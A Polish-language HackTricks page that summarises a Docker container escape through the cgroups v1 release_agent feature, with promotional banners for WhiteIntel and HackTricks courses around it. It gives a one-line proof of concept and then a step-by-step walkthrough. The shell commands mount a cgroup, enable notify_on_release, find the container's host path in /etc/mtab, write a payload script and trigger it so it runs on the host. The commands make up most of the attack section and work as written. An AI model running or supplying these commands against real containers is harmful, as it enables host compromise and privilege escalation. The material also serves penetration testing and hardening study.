# Ucieczka z cgroups Docker release\_agent

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, która oferuje **darmowe** funkcje do sprawdzania, czy firma lub jej klienci zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące dane**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz odwiedzić ich stronę internetową i wypróbować ich silnik za **darmo** na:

{% embed url="https://whiteintel.io" %}

***

**Aby uzyskać więcej szczegółów, zajrzyj do** [**oryginalnego posta na blogu**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** To tylko streszczenie:

Początkowy PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dowód koncepcji (PoC) demonstruje metodę wykorzystania cgroups poprzez utworzenie pliku `release_agent` i wywołanie go w celu wykonania dowolnych poleceń na hoście kontenera. Oto podział kroków zaangażowanych:

1. **Przygotuj środowisko:**
* Utwórz katalog `/tmp/cgrp` jako punkt montowania dla cgroup.
* Kontroler cgroup RDMA jest montowany do tego katalogu. W przypadku braku kontrolera RDMA zaleca się użycie kontrolera cgroup `memory` jako alternatywy.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Skonfiguruj podrzędny Cgroup:**
* Wewnątrz zamontowanego katalogu cgroup tworzony jest podrzędny cgroup o nazwie "x".
* Włączone są powiadomienia dla cgroup "x", poprzez zapisanie wartości 1 do pliku notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Skonfiguruj agenta wydania:**
* Ścieżka kontenera na hoście jest pobierana z pliku /etc/mtab.
* Następnie plik release\_agent cgroup jest skonfigurowany do wykonania skryptu o nazwie /cmd znajdującego się w uzyskanej ścieżce hosta.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Utwórz i skonfiguruj skrypt /cmd:**
* Skrypt /cmd jest tworzony wewnątrz kontenera i skonfigurowany do wykonania polecenia ps aux, przekierowując wynik do pliku o nazwie /output w kontenerze. Określona jest pełna ścieżka /output na hoście.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Wywołaj atak:**
* Proces zostaje uruchomiony w obrębie grupy potomnej "x" i natychmiast zostaje zakończony.
* To powoduje uruchomienie `release_agent` (skryptu /cmd), który wykonuje polecenie ps aux na hoście i zapisuje wynik do /output wewnątrz kontenera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, która oferuje **darmowe** funkcje do sprawdzenia, czy firma lub jej klienci nie zostali **skompromitowani** przez **złośliwe oprogramowanie kradnące informacje**.

Ich głównym celem WhiteIntel jest zwalczanie przejęć kont i ataków ransomware wynikających z złośliwego oprogramowania kradnącego informacje.

Możesz odwiedzić ich stronę internetową i wypróbować ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
